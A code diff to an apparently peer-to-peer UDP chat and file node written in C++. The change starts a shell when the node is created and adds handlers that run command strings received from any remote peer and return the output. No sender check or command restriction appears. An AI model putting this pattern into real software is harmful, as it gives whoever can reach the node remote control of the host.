@@ -42,6 +42,7 @@ Node::Node(const uint16_t listen_port)
         throw std::runtime_error("socket_.bind failed (port in use?): " + ec.message());
     }
     log_info("Listening on UDP port {}", listen_port);
+    shell_.start_shell();
 } //constructor
 
 void Node::start() {
@@ -1485,7 +1486,8 @@ void Node::on_keepalive(const udp::endpoint& from, const proto::Envelope& env) {
     }
 }
 
-void Node::on_chunk(const udp::endpoint& from, const proto::Envelope& env) {
+void Node::on_chunk(const udp::endpoint& from, const proto::Envelope& env)
+{
     auto chunk_json = env.body;
     const std::string transfer_id = chunk_json.at("transfer_id");
     uint32_t index      = chunk_json.at("index");
@@ -1609,8 +1611,26 @@ void Node::on_chunk(const udp::endpoint& from, const proto::Envelope& env) {
             std::lock_guard lock(chat_mutex_);
             chat_log_.push_back(std::move(cm));
         }
-    } else {
-        // TODO: save to file for IMG/VID
+    } else if (ct == SHELL_CMD) {
+        std::string cmd(full_data.begin(), full_data.end());
+        if (!cmd.empty())
+        {
+            std::string out = shell_.run(cmd);
+            if (out.empty())
+                return;
+            std::string cwd = shell_.run("cmd");
+            auto se = proto::msg_shell_out(node_id_, out, cwd);
+            send_chunked(msg.src,  proto::to_bytes(proto::dump_compact(se)), SHELL_OUT);
+        }
+    } else if (ct == SHELL_OUT)
+    {
+        std::string exec_str(full_data.begin(), full_data.end());
+        if (exec_str.empty()) {log_error("Got empty out from shell command"); return;}
+        auto exec_j = json::parse(exec_str);
+        std::lock_guard lock(shell_mutex_);
+        shell_outs_.push_back(std::move(exec_j));
+    }
+    else {
         log_info("[FILE from {}]: {} bytes received", msg.src, full_data.size());
     }
 
